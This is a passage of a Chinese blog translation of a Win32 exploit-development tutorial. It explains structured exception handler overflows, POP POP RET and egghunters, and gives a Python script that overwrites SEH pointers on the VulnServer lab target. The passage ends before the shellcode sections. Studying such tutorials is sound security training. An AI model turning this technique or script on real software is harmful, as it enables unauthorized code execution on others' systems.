<!DOCTYPE html><html lang="zh-CN"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>Win32缓冲区溢出-SEH溢出和Egghunters | madcoding’s blog</title><meta name="description" content="Win32缓冲区溢出-SEH溢出和Egghunters"><meta name="keywords" content="翻译"><meta name="author" content="madcoding"><meta name="copyright" content="madcoding"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://www.mad-coding.cn/2019/10/11/Win32缓冲区溢出-SEH溢出和Egghunters/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Win32缓冲区溢出-SEH溢出和Egghunters"><meta name="twitter:description" content="Win32缓冲区溢出-SEH溢出和Egghunters"><meta name="twitter:image" content="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028162833.png"><meta property="og:type" content="article"><meta property="og:title" content="Win32缓冲区溢出-SEH溢出和Egghunters"><meta property="og:url" content="https://www.mad-coding.cn/2019/10/11/Win32缓冲区溢出-SEH溢出和Egghunters/"><meta property="og:site_name" content="madcoding’s blog"><meta property="og:description" content="Win32缓冲区溢出-SEH溢出和Egghunters"><meta property="og:image" content="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028162833.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="Linux Notes" href="https://www.mad-coding.cn/2019/10/11/Linux Notes/"><link rel="next" title="我的漏洞库（不断跟新中）" href="https://www.mad-coding.cn/2019/10/11/我的漏洞库/"><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?4f375d7c7c0acbaae6032e476c824100";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.mad-coding.cn/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: '添加书签',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天'

  
}</script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-介绍"><span class="toc-text">0x01 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-1-异常处理程序101"><span class="toc-text">1.1 异常处理程序101</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-1-什么是例外？"><span class="toc-text">1.1.1 什么是例外？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-2-不同类型的处理程序"><span class="toc-text">1.1.2 不同类型的处理程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-3-那么结构化异常处理程序如何工作？"><span class="toc-text">1.1.3 那么结构化异常处理程序如何工作？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-4-漏洞"><span class="toc-text">1.1.4 漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-5-提及POP-POP-RET"><span class="toc-text">1.1.5 提及POP POP RET</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-5-1-什么是POP-POP-RET？"><span class="toc-text">1.1.5.1 什么是POP POP RET？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-5-2-我们为什么要POP-POP-RET？"><span class="toc-text">1.1.5.2 我们为什么要POP POP RET？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-5-3-查找POP-POP-RET模块和说明"><span class="toc-text">1.1.5.3 查找POP POP RET模块和说明</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-2-彩蛋猎人101"><span class="toc-text">1.2 彩蛋猎人101</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-1-什么是彩蛋猎人？"><span class="toc-text">1.2.1 什么是彩蛋猎人？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-2-彩蛋者如何工作？"><span class="toc-text">1.2.2 彩蛋者如何工作？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-3-一个关于NTDisplayString的词"><span class="toc-text">1.2.3 一个关于NTDisplayString的词</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-例子"><span class="toc-text">0x02 例子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-带Egghunter的VulnServer"><span class="toc-text">2.1 带Egghunter的VulnServer</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-1-模糊和发现崩溃"><span class="toc-text">2.1.1 模糊和发现崩溃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-2-寻找偏移"><span class="toc-text">2.1.2 寻找偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-3-寻找坏字符"><span class="toc-text">2.1.3 寻找坏字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-4-查找POP-POP-RET指令"><span class="toc-text">2.1.4 查找POP POP RET指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-5-生成Egghunter"><span class="toc-text">2.1.5 生成Egghunter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-6-跳到Egghunter"><span class="toc-text">2.1.6 跳到Egghunter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-7-生成Shellcode和最终利用"><span class="toc-text">2.1.7 生成Shellcode和最终利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-无需Egghunter的轻松文件共享Web服务器7-2"><span class="toc-text">2.2 无需Egghunter的轻松文件共享Web服务器7.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-1-模糊和发现崩溃"><span class="toc-text">2.2.1 模糊和发现崩溃</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-2-寻找偏移"><span class="toc-text">2.2.2 寻找偏移</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-3-寻找坏字符"><span class="toc-text">2.2.3 寻找坏字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-4-查找POP-POP-RET指令"><span class="toc-text">2.2.4 查找POP POP RET指令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-5-生成Shellcode"><span class="toc-text">2.2.5 生成Shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-6-最终利用"><span class="toc-text">2.2.6 最终利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-参考资料-资源"><span class="toc-text">0x03 参考资料/资源</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191028162833.png)"><div id="page-header"><span class="pull-left"> <a class="blog_title" id="site-name" href="/">madcoding’s blog</a></span><div class="open toggle-menu pull-right"><div class="menu-icon-first"></div><div class="menu-icon-second"></div><div class="menu-icon-third"></div></div><span class="pull-right menus"><div class="mobile_author_icon"><img class="lozad" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'"><div class="mobile_author-info__description">If you want to succeed, just do it.</div></div><hr><div class="menus_item"><a class="site-page" href="/ "><i class="fa-fw fa fa-home"></i><span> 首页</span></a><a class="site-page" href="/archives/"><i class="fa-fw fa fa-calendar"></i><span> 时间轴</span></a><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 类别</span></a><a class="site-page" href="/books/"><i class="fa-fw fa fa-book"></i><span> 读书</span></a><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-file-image-o"></i><span> 相册</span></a><a class="site-page" href="/pan/"><i class="fa-fw fa fa-hdd-o"></i><span> 资源</span></a><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a><a class="site-page" href="/留言板/"><i class="fa-fw fa fa-comment"></i><span> 留言板</span></a><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div><div id="post-info"><div id="post-title"><div class="posttitle">Win32缓冲区溢出-SEH溢出和Egghunters</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-10-11<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2019-11-15</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/主机安全/">主机安全</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">11.3k</span><span class="post-meta__separator">|</span><span>阅读时长≈: 45 分钟</span><span class="post-meta__separator">|</span><span>℃: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>这是一篇翻译的文章，出自<a href="https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。" target="_blank" rel="noopener">https://m0chan.github.io/2019/08/21/Win32-Buffer-Overflow-SEH.html，本作者只做翻译工作，版权为原作者所有，如有侵权，请联系删除。</a></p>
<a id="more"></a>

<h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><h2 id="1-1-异常处理程序101"><a href="#1-1-异常处理程序101" class="headerlink" title="1.1 异常处理程序101"></a>1.1 异常处理程序101</h2><p>在从漏洞利用的角度出发进行研究之前，让我们首先讨论一下<strong>异常处理程序的</strong> <em>真正</em>含义，不同的类型以及它们在Windows OS中的服务目的。</p>
<h3 id="1-1-1-什么是例外？"><a href="#1-1-1-什么是例外？" class="headerlink" title="1.1.1 什么是例外？"></a>1.1.1 什么是例外？</h3><p><em>异常是在程序/功能执行期间发生的事件</em></p>
<h3 id="1-1-2-不同类型的处理程序"><a href="#1-1-2-不同类型的处理程序" class="headerlink" title="1.1.2 不同类型的处理程序"></a>1.1.2 不同类型的处理程序</h3><p><strong>异常处理程序（EH）</strong> -一段代码，将尝试<em>执行某项操作，</em>并根据结果选择预定义的课程。例如，如果失败，请尝试执行此操作。</p>
<p><strong>结构化异常处理程序（SEH）-</strong> Windows内置的异常处理程序，如果开发特定的异常处理程序失败或主要使用，则可用于回退。</p>
<p><strong>下一个结构化异常处理程序（nSEH）-</strong></p>
<p>现在，如您在上面看到的，我<strong>确实</strong>提到了<strong>EH / SEH，</strong>因为<strong>异常处理程序</strong>分为两个不同的类别，即<em>OS级别</em>处理程序和/或由开发人员自己实现的处理程序。如您所见，Windows具有一个称为<strong>SEH</strong>的<em>操作系统级别</em>。</p>
<p>因此，基本上，<strong>异常处理程序</strong>是程序内部编写的代码段，其唯一目的是处理应用程序可能引发的任何<em>异常</em>或错误。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    // Code to try goes here.</span><br><span class="line">&#125;</span><br><span class="line">catch (SomeSpecificException ex)</span><br><span class="line">&#123;</span><br><span class="line">    // Code to handle the exception goes here.</span><br><span class="line">&#125;</span><br><span class="line">finally</span><br><span class="line">&#123;</span><br><span class="line">    // Code to execute after the try (and possibly catch) blocks </span><br><span class="line">    // goes here.</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的例子代表了一个基本的异常处理程序<strong>（EH）</strong>在<code>C#</code>由开发人员实现-有时候看着像上面的代码可以是相当吓人非程序员，但所有我们真正做的是说<code>try</code>运行这段代码：如果有错误/无论<code>catch</code>块包含什么内容，都将发生异常。简单！</p>
<p>现在，对于软件开发人员来说，编写自己的异常处理程序来管理软件可能遇到的任何错误/警告并不少见，但是<strong>Windows</strong>还内置了一个称为<strong>结构化异常处理程序（SEH）的程序</strong>，它可以抛出诸如以下的错误消息<code>Program.exe has stopped working and needs to close</code>：确保您之前都看过它们。</p>
<p>还值得一提的是，无论在<strong>OS级别</strong>和/或<strong>开发人员级别</strong>定义了<strong>异常处理**</strong>程序<strong>，</strong>Windows SEH都会<strong>通过一组指定的内存位置和<em>功能</em>对所有</strong>处理程序<strong>进行集中和一致的控制和管理，无论是在</strong>操作系统级别<strong>和/或</strong>开发人员级别。**。</p>
<h3 id="1-1-3-那么结构化异常处理程序如何工作？"><a href="#1-1-3-那么结构化异常处理程序如何工作？" class="headerlink" title="1.1.3 那么结构化异常处理程序如何工作？"></a>1.1.3 那么结构化异常处理程序如何工作？</h3><p>那么，它们如何工作？SEH井是Windows中的一种机制，它利用称为<strong>链接列表</strong>的数据结构/布局来包含一系列存储位置。触发异常后，操作系统将检索<strong>SEH链</strong>的头部并遍历列表，处理程序将评估最相关的操作过程，以正常关闭程序或执行指定的操作以从<em>异常中</em>恢复。（更多有关链接的信息）</p>
<p>当我们运行一个应用程序时，将执行该应用程序，并从<em>该应用程序</em>内部运行每个<strong>功能</strong>，都会创建一个<strong>堆栈帧</strong>，然后在该函数<em>返回</em>或完成执行后最终<strong>弹出</strong>该<strong>堆栈帧</strong>。现在对于<strong>异常处理程序</strong>实际上同样如此。基本上，如果你运行一个函数具有<strong>异常处理程序</strong>嵌入itself-该异常处理程序将获得它自己的专用<strong>堆栈帧</strong></p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161604.png" class="lozad"></p>
<p><em>资料来源：ethicalhacker.net</em></p>
<p>如您所见，每个<strong>代码块</strong>都有自己的<strong>堆栈框架</strong>，由链接每个相应<em>框架</em>的箭头表示。</p>
<p>那么……它们是如何联系的？对每个<strong>异常处理程序来说</strong>，都有一个配置的<strong>异常注册记录</strong>，这些<strong>记录</strong>都链接在一起形成一个链表。该<strong>异常注册记录</strong>中包含众多领域，但即<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>它定义的下一个<strong>异常注册记录</strong>在<strong>SEH链</strong> -这是什么使我们过导航<strong>SEH链</strong>从<em>顶部至底部</em>。</p>
<p>现在，您可能想知道<strong>Windows SEH</strong>如何使用<strong>异常注册记录</strong>和<strong>处理程序</strong>等。当发生异常时，操作系统将从<strong>SEH链</strong>的顶部启动，并检查第一个<strong>异常注册记录</strong>以查看它是否可以处理异常/错误，如果可以，它将执行指向<strong>异常处理程序</strong>的指针定义的代码块-但是，如果不能，它将使用字段移至下<strong>一条*</strong>记录，<em>并沿*</em>SEH链*<em>向下<code>_EXCEPTION_REGISTRATION_RECORD *Next;</code>移动，并继续执行因此一直沿链向下，直到找到能够处理异常的</em>记录/处理程序*。</p>
<p>但是，如果没有预定义的异常处理程序功能适用，该怎么办？良好的窗口在每个<strong>SEH链</strong>的底部放置了一个默认/通用异常处理程序，它可以提供如下通用消息<code>Your program has stopped responding and needs to close</code>：通用处理程序在上图中由表示<code>0xffffff</code></p>
<p>下图提供了整个<strong>SEH链</strong>的简化概述</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161629.png" class="lozad"></p>
<p>我们还可以通过加载二进制文件并<strong>单击</strong>来查看具有<strong>免疫性</strong>的<strong>SEH链</strong><code>Alt+S</code> -如您在下图中所看到的，我们的<strong>SEH链</strong>在左下角以绿色突出显示，而<strong>SEH Record / SEH Handler</strong>在屏幕上以蓝色突出显示。堆。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161624.png" class="lozad"></p>
<p>在这种情况下，我们实际上有2个由<strong>SEH Records</strong>指定的处理程序-第一个是正常实现的处理程序，而第二个是地址<code>0028FFC4</code>的Window的<strong>OS Level</strong>处理程序，我们可以在下面的屏幕快照中看到。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161640.png" class="lozad"></p>
<h3 id="1-1-4-漏洞"><a href="#1-1-4-漏洞" class="headerlink" title="1.1.4 漏洞"></a>1.1.4 漏洞</h3><p>因此，回顾一下，我们已经介绍了异常是什么，不同类型的处理程序，还讨论了<strong>结构化异常处理程序的</strong> <em>真正</em>工作原理，因此现在我们可能应该从攻击者的角度谈谈这一点以及我们如何利用这些<strong>异常处理程序。</strong>处理程序来获得对程序执行流程的控制，类似于<code>EIP Overwrite</code>第1部分中的内容。</p>
<p>现在在<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">这里的</a>第1部分中-我们能够控制VulnServer和SLMail上的<em>执行流程</em>，从而也将它重定向到我们自己的<em>shellcode</em>并弹出一个反向shell，这当然是一个非常古老的漏洞，SEH应该解决此问题，但是一个非常糟糕的实现，很快就被利用了。</p>
<p>现在，我不想在这里展示一个疯狂的示例，因为我将在下面的“ <strong>示例”</strong>部分中进行介绍，但是这里的理论是我们不使用用户控制输入覆盖EIP，而是覆盖指向<strong>下一个SEH记录</strong>（即<strong>异常注册）</strong>的指针<strong>记录</strong>以及指向<strong>SE处理程序</strong>的指针，这些指针指向我们控制并可以放置shellcode的内存区域。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161651.png" class="lozad"></p>
<p>如您所见，我们没有像第1 部分那样覆盖<strong>EIP寄存器</strong>，<code>41414141</code>而是覆盖了<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针。现在，在开始讨论Egghunter以及进行<em>SEH溢出</em>时如何使用它们之前，我想快速向您展示与<strong>SE Handler</strong>和<strong>SEH Record</strong>的指针相比，我们如何控制<strong>EIP寄存器</strong>。</p>
<p>我不会深入探讨细节，但是如果我们可以对永不重复的字符串进行<em>模糊处理</em>，然后计算偏移量，然后使用选择的数据覆盖<strong>SE Handler</strong>和<strong>SE Record</strong>，该偏移量可用于控制EIP。</p>
<p>在下面的示例中，我分析了偏移也是<strong>SE Record</strong>，<code>3519 Bytes</code>因此我在<strong>SE Record上</strong>加上了4 x B ，在<strong>SE Handler上</strong>加上了4 <strong>xC</strong>。查看下面的脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nseh = &quot;BBBB&quot; </span><br><span class="line">seh = &quot;CCCC&quot;</span><br><span class="line"></span><br><span class="line">buffer=&quot;A&quot; * 3515</span><br><span class="line">buffer += nseh</span><br><span class="line">buffer += seh</span><br><span class="line"></span><br><span class="line">junk = &quot;D&quot;*(4500-len(buffer))</span><br><span class="line">buffer += junk</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">	print &quot;[*] Starting to Fuzz GMON&quot;</span><br><span class="line">	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">	connect=s.connect((&apos;bof.local&apos;,9999))</span><br><span class="line">	print &quot;[*] Connected to bof.local on Port 9999&quot;</span><br><span class="line">	s.send((&apos;GMON /.:/&apos; + buffer))</span><br><span class="line">	print &quot;[*] Finished Fuzzing Check SEH Chain on Immunity&quot;</span><br><span class="line">	s.close()</span><br><span class="line">except:</span><br><span class="line">	print &quot;couldn&apos;t connect to server&quot;</span><br></pre></td></tr></table></figure>

<p>现在，如果我们跳过<strong>Immunity</strong>并查看<strong>SEH链，</strong>我们将看到以下内容。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115161702.png" class="lozad"></p>
<p>首先让我向您展示一些东西，当前应用程序处于崩溃状态（当然），但是我们仍然可以通过按<strong>Shift + F9</strong>将异常传递给程序-如果这样做，我们会注意到一些有趣的东西。</p>
<p><strong>SE Handler</strong>在堆栈上的值被压入<strong>EIP寄存器</strong> ，这当然不是很理想！现在，我们可以控制整个程序的执行流程。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162151.png" class="lozad"></p>
<h3 id="1-1-5-提及POP-POP-RET"><a href="#1-1-5-提及POP-POP-RET" class="headerlink" title="1.1.5 提及POP POP RET"></a>1.1.5 提及POP POP RET</h3><p>因此，如您在上面的屏幕截图/示例中所看到的，我们实际上生活在<strong>SE Handler</strong>的土地或区域中，由于空间的限制以及我们必须使用的存储区域的小巧性，我们实际上并不好当然，我们也许可以将Egghunters纳入其中，但我将在本文后面讨论。我想首先谈谈<code>POP POP RET</code>通常与<strong>SEH溢出</strong>结合使用的技术<strong>。</strong></p>
<h4 id="1-1-5-1-什么是POP-POP-RET？"><a href="#1-1-5-1-什么是POP-POP-RET？" class="headerlink" title="1.1.5.1 什么是POP POP RET？"></a><strong>1.1.5.1 什么是POP POP RET？</strong></h4><p>现在，实际上，<code>POP POP RET</code>我们将<strong>SE Handler</strong>值替换为一条<code>POP POP RET</code>指令的内存地址，这将听起来很真实，这将在技术上运行这些汇编指令，从而将我们<strong>引向nSEH。</strong></p>
<p>值得一提的是，<em>弹出</em>值转到的寄存器并不重要，我们只需要将<strong>ESP</strong> 的值上移<em>两次</em>，然后返回即可执行。因此<em>POP EAX</em>，<em>POP EBC，POP ECX</em>等都将适用，只要<code>RET</code>在两次<em>弹出</em>后有相关说明</p>
<h4 id="1-1-5-2-我们为什么要POP-POP-RET？"><a href="#1-1-5-2-我们为什么要POP-POP-RET？" class="headerlink" title="1.1.5.2 我们为什么要POP POP RET？"></a>1.1.5.2 我们为什么要POP POP RET？</h4><p>现在，如果您回想<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a> -一旦我们获得了对<strong>返回地址</strong>和<strong>EIP的</strong>控制，我们就找到了一条<strong>JMP ESP</strong>指令，以跳到我们的堆栈代码的顶部，在此我们的shell代码和NOP滑动，我们获得了代码执行权。现在，如果我们尝试向<strong>SE Handler中</strong>添加<strong>JMP ESP</strong>指令的内存位置，则Windows会自动将所有寄存器清零，以防止用户跳到那里的shellcode，但这确实是一个有缺陷的保护机制。</p>
<p>您实际上可以在下面的屏幕中看到<strong>ESI</strong>和<strong>EDI</strong>已被清零，以帮助减轻攻击者直接跳到Shellcode的风险。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162200.png" class="lozad"></p>
<p>现在就在这里<code>POP POP RET</code>，让我们首先记住一下<strong>SEH Record</strong>＆<strong>Handler</strong>在堆栈上的布局</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162211.png" class="lozad"></p>
<p>现在，让我们考虑一下<strong>POP POP RET</strong>在这里将执行的操作：<em>POP（向上移动4个字节）<em>，</em>POP（向上移动4个字节）<em>和</em>RET（简单返回，将地址发送给EIP作为下一条要执行的指令）</em> -现在我们有了完全控制权； ）</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162219.png" class="lozad"></p>
<h4 id="1-1-5-3-查找POP-POP-RET模块和说明"><a href="#1-1-5-3-查找POP-POP-RET模块和说明" class="headerlink" title="1.1.5.3 查找POP POP RET模块和说明"></a>1.1.5.3 查找POP POP RET模块和说明</h4><p>现在，我不想在这里深入探讨如何找到适用的模块和说明，因为我将在示例部分中介绍它，但长话短说是<strong>mona</strong></p>
<p>与<a href="https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html" target="_blank" rel="noopener">第1部分</a>类似，我们大量使用了<strong>mona</strong>，在执行<strong>SEH溢出</strong>时也将使用它-我们要做的就是发出以下命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!mona seh</span><br></pre></td></tr></table></figure>

<p>这将自动在所有可用模块中搜索<code>POP POP RET</code>序列。</p>
<p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115162234.png" class="lozad"></p>
<p>现在，就像漏洞利用一样，我们必须确保我们选择内存地址中具有0个错误字符的模块，并避免使用诸如<strong>SEEPSEH之类的*</strong>SEH防护措施*，我将在后面讨论。</p>
<hr>
<h2 id="1-2-彩蛋猎人101"><a href="#1-2-彩蛋猎人101" class="headerlink" title="1.2 彩蛋猎人101"></a>1.2 彩蛋猎人101</h2><h3 id="1-2-1-什么是彩蛋猎人？"><a href="#1-2-1-什么是彩蛋猎人？" class="headerlink" title="1.2.1 什么是彩蛋猎人？"></a>1.2.1 什么是彩蛋猎人？</h3><p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p>
<h3 id="1-2-2-彩蛋者如何工作？"><a href="#1-2-2-彩蛋者如何工作？" class="headerlink" title="1.2.2 彩蛋者如何工作？"></a>1.2.2 彩蛋者如何工作？</h3><p><a href="https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf" target="_blank" rel="noopener">https://www.exploit-db.com/docs/english/18482-egg-hunter-a-twist-in-buffer-overflow.pdf</a></p>
<p>我想概述一下Egghunters在这里的工作方式，而无需深入了解，就像我上面已经说过的那样</p>
<p><em>Egghunter是一小段shellcode，通常为32个字节，可用于在所有内存空间中搜索我们的最后阶段shellcode</em></p>
<p>这听起来不错，但为什么不仅仅使用简单的<strong>Short JMP</strong>或<strong>JMP ESP</strong>跳转到我们的shellcode- 想象一下您有很少的空间可以使用，例如<strong>50字节</strong>。这没有足够的空间来放置一些shell代码，但是足以放置一个<strong>32字节的Egghunter</strong></p>
<p>假设我们可以将<strong>32字节的</strong> hunter放入堆栈/内存，并且能够将执行重定向到hunter的位置，我们可以告诉hunter在整个内存空间中搜索预定义的标签，例如<code>MOCH</code>，我们的shellcode将是直接放在此标签（又称<strong>鸡蛋）之后</strong></p>
<p>所以执行流程看起来像这样</p>
<ol>
<li>控制执行力</li>
<li>跳转到包含<strong>32字节Egghunter的</strong>小缓冲区空间</li>
<li>Egghunter执行并在所有内存中搜索<strong>预定义的鸡蛋</strong></li>
<li>Egghunter找到<strong>鸡蛋</strong>并执行放置<em>在</em> <strong>鸡蛋*</strong>之后的* shellcode</li>
</ol>
<h3 id="1-2-3-一个关于NTDisplayString的词"><a href="#1-2-3-一个关于NTDisplayString的词" class="headerlink" title="1.2.3 一个关于NTDisplayString的词"></a>1.2.3 一个关于NTDisplayString的词</h3><p>在本文中，我们将使用<strong>32字节</strong> Egghunter，它利用<code>NTDisplayString</code>显示为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI </span><br><span class="line">NTSTATUS</span><br><span class="line">NTAPI</span><br><span class="line"></span><br><span class="line">NtDisplayString(</span><br><span class="line"></span><br><span class="line">  IN PUNICODE_STRING      String );</span><br></pre></td></tr></table></figure>

